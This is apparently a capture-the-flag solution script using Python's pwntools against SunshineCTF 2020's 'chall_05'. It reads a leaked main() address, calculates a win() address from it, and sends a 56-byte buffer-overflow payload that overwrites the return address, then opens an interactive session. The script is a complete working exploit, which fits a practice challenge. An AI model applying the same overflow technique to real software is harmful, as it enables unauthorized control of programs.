from pwn import *

elf = ELF('./chall_05')
#io = process(elf.path)
io = remote('chal.2020.sunshinectf.org', 30005)

base = b'A' * 56

io.recvline()
io.sendline()
main_add = io.recvline().replace(b"Yes I'm going to win: 0x", b"").replace(b"\n", b"")
print("main address: {}".format(hex(int(main_add, 16))))
print("win address: {}".format(hex(int(main_add, 16) - 19)))
payload = base + p64(int(main_add, 16) - 19)
io.sendline(payload)
io.interactive()